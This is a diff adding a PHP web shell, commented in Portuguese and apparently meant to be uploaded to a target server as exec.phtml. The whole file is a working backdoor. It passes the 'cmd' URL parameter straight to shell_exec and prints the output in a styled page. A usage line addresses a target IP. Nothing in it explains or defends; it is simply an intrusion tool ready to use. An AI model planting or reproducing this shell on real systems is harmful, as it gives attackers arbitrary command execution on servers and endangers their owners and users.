@@ -1,0 +1,40 @@
+<?php
+/**
+ * Web Shell para Execução Remota de Código (RCE)
+ * Uso: http://[IP-DO-ALVO]/exec.phtml?cmd=[id]
+ */
+
+// Opcional: Define o tempo limite para evitar que scripts longos travem o servidor
+set_time_limit(30);
+
+// Verifica se o parâmetro 'cmd' foi enviado pela URL
+if(isset($_GET['cmd'])) {
+    $comando = $_GET['cmd'];
+    
+    // Cabeçalho de estilo simples para o navegador
+    echo "<html><body style='background-color:#1e1e1e; color:#00ff00; font-family:monospace; padding:20px;'>";
+    echo "<h3>Executando: " . htmlspecialchars($comando) . "</h3>";
+    echo "<pre style='background-color:#000; padding:15px; border:1px solid #333;'>";
+    
+    // Captura a saída e os erros (2>&1 redireciona erros para a saída padrão)
+    // shell_exec é geralmente a função mais estável para capturar a saída
+    $resultado = shell_exec($comando . " 2>&1");
+    
+    // Exibe o resultado ou uma mensagem caso não haja saída
+    if ($resultado === null || $resultado === "") {
+        echo "Comando executado com sucesso, mas sem retorno (ou comando inválido).";
+    } else {
+        echo htmlspecialchars($resultado);
+    }
+    
+    echo "</pre>";
+    echo "<br><a href='javascript:history.back()' style='color:#00ff00;'>Voltar</a>";
+    echo "</body></html>";
+} else {
+    // Instrução se nenhum comando for passado
+    echo "<body style='background-color:#1e1e1e; color:#fff; font-family:sans-serif; text-align:center; padding-top:50px;'>";
+    echo "<h1>Web Shell pronto</h1>";
+    echo "<p>Use: <code>?cmd=seu_comando</code></p>";
+    echo "</body>";
+}
+?>
